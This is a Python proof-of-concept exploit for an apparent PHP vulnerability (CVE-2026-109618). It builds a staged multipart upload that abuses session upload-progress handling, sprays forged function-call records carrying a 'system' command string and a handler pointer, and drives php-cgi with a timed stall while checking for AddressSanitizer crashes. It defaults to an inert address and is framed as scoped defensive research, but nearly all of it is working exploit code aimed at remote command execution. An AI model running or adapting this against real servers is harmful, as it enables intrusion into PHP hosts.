#!/usr/bin/env python3

"""producer_618.py - CVE-2026-109618 staged multipart producer.

Adapted from `poc0_109618.py` in the PHP-UP-2026 bundle by J4ck3LSyN, with
PoCs by Andrew Dorman / @acd421; published at
https://jackalsyn.com/posts/php-up-2026.html and mirrored at
cereZ23/php-up-2026, commit c63f145596dbe9cdd437d24ed2418f0c1e59bcc2.

That bundle states no open-source license and is marked "Authorized
defensive-research / scoped-engagement use only." This file is an adaptation,
not a relicensing: the repository's AGPL-3.0 does not apply to the upstream
material and grants no rights the authors did not grant. See
THIRD_PARTY_NOTICES.md.

Inert forge default: build(sid, cmd, call) -> (phase1, tail).
"""

import argparse
import os
import struct
import subprocess
import sys
import time

FILL = 5120
N149 = 149
BLOB = 288
FCI = 64
IS_STRING_EX = 0x106
IS_OBJECT_EX = 0x308
ZEND_INTERNAL = 1
BOUND = b"B7kQpoc618"


def forge(call: int, cmd: bytes) -> bytes:
    rec = bytearray(BLOB)
    struct.pack_into("<Q", rec, 0, FCI)
    struct.pack_into("<Q", rec, 8, call)
    struct.pack_into("<I", rec, 16, IS_STRING_EX)
    struct.pack_into("<I", rec, 48, 1)
    struct.pack_into("<B", rec, 64, ZEND_INTERNAL)
    struct.pack_into("<Q", rec, 64 + 88, call)  # handler slot -> call target
    struct.pack_into("<I", rec, 160, IS_OBJECT_EX)
    sysb = b"system\x00" + cmd + b"\x00"
    rec[200:200 + len(sysb)] = sysb[:80]
    return bytes(rec)


def part(b: bytes, name: str, body: bytes, filename=None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + b + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build(sid: str, cmd: bytes, call: int):
    spray = forge(call, cmd)
    assert BOUND not in spray, "boundary collision"
    pre = b"".join([
        part(BOUND, "PHPSESSID", sid.encode()) + b"\r\n",
        part(BOUND, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n",
        part(BOUND, "f", b"", filename="a") + b"\r\n",
    ])
    c1 = b"A" * (FILL + 64)
    phase1 = pre + c1
    tail = b"B" * (FILL + 64) + b"\r\n"
    for _ in range(N149):
        tail += part(BOUND, "t[]", spray) + b"\r\n"
    tail += part(BOUND, "g", b"C" * 64, filename="b") + b"\r\n"
    tail += b"--" + BOUND + b"--\r\n"
    return phase1, tail


def run_cgi(cgi: str, phase1: bytes, tail: bytes, sid: str, stall: float,
            sessdir: str, php_d=None):
    ep = "/tmp/opencode/realapps/side/empty.php"
    env = dict(os.environ)
    env.update(
        REDIRECT_STATUS="200",
        REQUEST_METHOD="POST",
        CONTENT_TYPE="multipart/form-data; boundary=B7kQpoc618",
        CONTENT_LENGTH=str(len(phase1) + len(tail)),
        SCRIPT_FILENAME=ep,
        QUERY_STRING="",
        HTTP_COOKIE=f"PHPSESSID={sid}",
        GATEWAY_INTERFACE="CGI/1.1",
        SERVER_PROTOCOL="HTTP/1.1",
        SERVER_NAME="lab",
    )
    args = [cgi, "-d", "cgi.force_redirect=0",
            "-d", f"session.save_path={sessdir}"]
    for kv in php_d or []:
        args += ["-d", kv]
    p = subprocess.Popen(args, env=env, stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p.stdin.write(phase1)
    p.stdin.flush()
    time.sleep(stall)
    p.stdin.write(tail)
    p.stdin.flush()
    p.stdin.close()
    out = p.stdout.read()
    err = p.stderr.read()
    rc = p.wait()
    return rc, out, err


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cgi", default=None)
    ap.add_argument("--sid", default="poc618-001")
    ap.add_argument("--stall", type=float, default=1.35)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--call", default="0", help="zend_call_function absolute addr")
    ap.add_argument("--sessdir", default="/tmp/opencode/realapps/side/sess")
    ap.add_argument("--print", action="store_true")
    ap.add_argument("-d", dest="php_d", action="append", default=[],
                    help="extra php -d ini (lab observation only)")
    ap.add_argument("-o", "--out-prefix", default=None)
    a = ap.parse_args()
    call = int(a.call, 0)
    phase1, tail = build(a.sid, a.cmd.encode(), call)
    total = len(phase1) + len(tail)
    print(f"phase1={len(phase1)} tail={len(tail)} total={total} "
          f"call={call:#x} inert={call == 0}")
    if a.out_prefix:
        with open(a.out_prefix + ".phase1", "wb") as f:
            f.write(phase1)
        with open(a.out_prefix + ".tail", "wb") as f:
            f.write(tail)
        print(f"wrote {a.out_prefix}.phase1/.tail")
        return
    if not a.cgi:
        return
    sessfile = os.path.join(a.sessdir, f"sess_{a.sid}")
    if os.path.exists(sessfile):
        os.unlink(sessfile)
    t0 = time.time()
    rc, out, err = run_cgi(a.cgi, phase1, tail, a.sid, a.stall, a.sessdir,
                           php_d=a.php_d)
    dt = time.time() - t0
    sz = os.path.getsize(sessfile) if os.path.exists(sessfile) else -1
    print(f"exit={rc} dt={dt:.2f}s sess_size={sz} outB={len(out)} errB={len(err)}")
    if err:
        sys.stdout.buffer.write(b"--- stderr (first 2000) ---\n")
        sys.stdout.buffer.write(err[:2000])
    asan = b"AddressSanitizer" in err
    print("ASAN_HIT" if asan else "asan_clean")


if __name__ == "__main__":
    main()
